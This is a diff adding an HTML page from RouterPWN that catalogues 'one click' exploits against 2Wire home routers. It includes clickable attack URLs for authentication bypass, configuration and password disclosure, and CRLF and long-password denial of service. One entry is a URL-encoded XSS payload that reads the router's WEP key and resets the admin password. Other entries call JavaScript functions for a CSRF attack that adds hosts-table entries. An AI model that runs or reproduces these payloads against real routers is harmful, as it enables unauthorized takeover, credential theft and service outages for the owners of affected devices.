@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - 2Wire - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="wire">
+       <h1>
+        2Wire
+       </h1>
+ <table id="tabla" class="display" cellspacing="0" width="100%" >
+        <thead>
+            <tr>
+                <th>Date</th>
+                <th>Category</th>
+                <th>Source</th>
+                <th>Title</th>
+                <th>Author</th>
+            </tr>
+        </thead>
+ 
+        <tfoot>
+            <tr>
+                <th>Date</th>
+                <th>Category</th>
+                <th>Source</th>
+                <th>Title</th>
+                <th>Author</th>
+            </tr>
+        </tfoot>
+ 
+        <tbody>
+            <tr>
+                <td>2012/12/31</td>
+                <td>One click</td>
+                <td><a href="https://www.underground.org.mx/index.php?topic=28616.0">Underground</a></td>
+                <td><a href="javascript:twowire4011g5012nv_dirtraversal()">4011G y 5012NV directory traversal</a> <a href="javascript:twowire4011g5012nv_dirtraversal(ip)" onclick="return ip=prompt('IP:');"> [SET IP]</a></td>
+                <td>Adiaz</td>
+            </tr>
+            <tr>
+                <td>2012/03/02</td>
+                <td>One click</td>
+                <td><a href="https://www.underground.org.mx/index.php?topic=22175.msg141787#msg141787">Underground</a></td>
+                <td><a href="http://gateway.2wire.net/xslt?PAGE=BJ_STATUS">2701HG remote administration password disclosure</a> <a href="javascript:setip('/xslt?PAGE=BJ_STATUS')">[SET IP]</a></td>
+                <td>Adiaz</td>
+            </tr>
+            <tr>
+                <td>2011/11/01</td>
+                <td>One click</td>
+                <td><a href="http://blog.szechuen.com/cve-2011-3682">Sze Chuen</a></td>
+                <td><a href="javascript:singwiredos.submit()">2701HGV-E 2700HGV-2 2700HG singtel mdc password DoS</a> <a href="javascript:setip('/xslt?PAGE=BJ_STATUS')">[SET IP]</a></td>
+                <td>Sze Chuen</td>
+            </tr>
+            <tr>
+                <td>2011/07/14</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/1-003.full.txt">hakim.ws</a></td>
+                <td><a href="http://home/xslt?PAGE=A05&THISPAGE=%3C/script%3E%3Cscript%3Eeval(unescape(location.href))%3C/script%3E#%0Atry%20%7B%20%0A%09xmlhttp%3Dnew%20ActiveXObject%28%22MSXML2.XMLHTTP%22%29%3B%20%0A%7D%20catch%28e%29%20%7B%20%0A%09xmlhttp%20%3D%20new%20XMLHttpRequest%28%29%20%0A%7D%0Avar%20pass%20%3D%20prompt%28%22New%20password%3A%22%29%3B%0Axmlhttp.open%28%22GET%22%2C%22%2fxslt%3Fpage%3Dmgmt_data%22%2Cfalse%29%3B%0Axmlhttp.send%28null%29%3B%0Avar%20info%20%3D%20xmlhttp.responseText%3B%0Avar%20wep%20%3D%20info.substr%28info.indexOf%28%22encrypt_key%5C%22%5C%3E0x%22%29%2b15%2C10%29%3B%0Axmlhttp.open%28%22POST%22%2C%22%2fxslt%22%2Ctrue%29%3B%0Axmlhttp.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3B%0Axmlhttp.send%28%22PAGE%3DA04_POST%26THISPAGE%3DA04%26NEXTPAGE%3DA04_POST%26SYSKEY%3D%22%2bwep%2b%22%26PASSWORD%3D%22%2bpass%2b%22%26PASSWORD_CONF%3D%22%2bpass%2b%22%26HINT%3D%22%2bpass%29%3B%0Aalert%28%22Done%22%29">20x 27x authentication bypass (xss + info disclosure)</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2009/10/29</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/1-003.full.txt">hakim.ws</a></td>
+                <td><a href="https://home:50001/xslt?page=%0d%0a">17x 18x 20x 27x CRLF denial of service remote MDC</a> <a href="javascript:wirecrlfr()">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2009/10/29</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/1-003.full.txt">hakim.ws</a></td>
+                <td><a href="http://home/xslt?page=%0d%0a">17x 18x 20x 27x CRLF denial of service</a> <a href="javascript:wirecrlfr()">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2009/08/18</td>
+                <td>One click</td>
+                <td><a href="http://www.exploit-db.com/exploits/9459">exploit-db</a></td>
+                <td><a href="http://gateway.2wire.net/setup/password_required.html">17x 18x 20x 27x password_required.html authentication bypass</a> <a href="javascript:setip('/setup/password_required.html')">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2009/08/11</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/1-003.full.txt">hakim.ws</a></td>
+                <td><a href="http://home/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm">17x 18x 20x 27x CRLF denial of service remote MDC</a> <a href="javascript:setip('/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm')">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2009/08/11</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">hakim.ws</a></td>
+                <td><a href="http://home/xslt?page=CD35_SETUP_01">17x 18x 20x 27x CD35_SETUP_01 authentication bypass</a> <a href="javascript:setip('/xslt?page=CD35_SETUP_01')">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2008/08/30</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">hakim.ws</a></td>
+                <td><a href="http://home/xslt?page=H04">17x 18x 20x 27x H04 authentication bypass</a> <a href="javascript:setip('/xslt?page=H04')">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2008/04/13</td>
+                <td>One click</td>
+                <td><a href="http://hakim.ws/2wire/dsldos.html">hakim.ws</a></td>
+                <td><a href="http://home/xslt?page%3D%25%5E">17x 18x 20x 27x DSL denial of service</a> <a href="javascript:setip('%2Fxslt?page%3D%25%5E')">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2008/08/07</td>
+                <td>One click</td>
+                <td><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">hakim.ws</a></td>
+                <td><a href="http://home/xslt?page=mgmt_data">17x 18x 20x 27x mgmt_data configuration disclosure</a> <a href="javascript:setip('/xslt?page=mgmt_data')">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+            <tr>
+                <td>2007/07/14</td>
+                <td>One click</td>
+                <td><a href="http://hakim.ws/textos/2wirexsrf.txt">hakim.ws</a></td>
+                <td><a href="javascript:wireAddHosts()">17x 18x 20x 27x 38x Add domain to hosts table CSRF</a> <a href="javascript:wireAddHostsip()">[SET IP]</a></td>
+                <td>hkm</td>
+            </tr>
+        </tbody>
+</table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
